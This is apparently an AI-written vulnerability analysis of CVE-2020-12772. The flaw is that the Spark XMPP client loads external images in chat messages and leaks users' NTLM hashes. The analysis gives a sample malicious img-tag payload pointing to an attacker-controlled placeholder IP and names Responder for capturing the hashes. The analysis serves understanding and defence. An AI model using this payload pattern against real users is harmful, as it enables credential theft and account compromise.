Based on the provided content, here's an analysis of CVE-2020-12772:

**Root cause of vulnerability:**
The vulnerability stems from the Spark XMPP client's handling of image tags within chat messages, specifically when an external URL is used as the image source. The client attempts to load the image, which triggers a request to the external server.

**Weaknesses/vulnerabilities present:**
- **NTLM hash leakage:** When the Spark client tries to load an image from an external server, it sends the user's NTLM hashes along with the request.
- **Lack of Input Sanitization:** The client doesn't properly sanitize or validate image source URLs, allowing arbitrary external URLs to be used.
- **Automatic Preloading/Click Trigger:**  The ROAR module automatically preloads images or the user may click on the link, triggering a request to the external server with the user's NTLM hashes.

**Impact of exploitation:**
- **Credential theft:** An attacker can capture the NTLM hashes of users who view a chat message containing a malicious image link.
- **Account compromise:** Captured NTLM hashes can be used to gain access to the user account.
- **Privilege escalation:** Depending on the user's permissions, an attacker could escalate their privileges on the system/network.

**Attack vectors:**
- **Malicious chat messages:** An attacker sends a crafted chat message containing an `<img src="[external_ip]/test.img">` tag to the victim user through the Spark XMPP client.

**Required attacker capabilities/position:**
- The attacker needs to be able to send messages to the victim user via the Spark XMPP client.
- The attacker needs to have an external server under their control to capture the NTLM hashes sent by the vulnerable client.
- The attacker needs to set up a listener (e.g. using Responder) to capture the NTLM hashes.

**Additional details not in the original CVE description:**
- The content specifies that the vulnerability affects the Spark XMPP client and its ROAR module.
- The content details the use of Responder to capture NTLM hashes.
- The vulnerability is demonstrated in the context of a Capture the Flag (CTF) scenario.
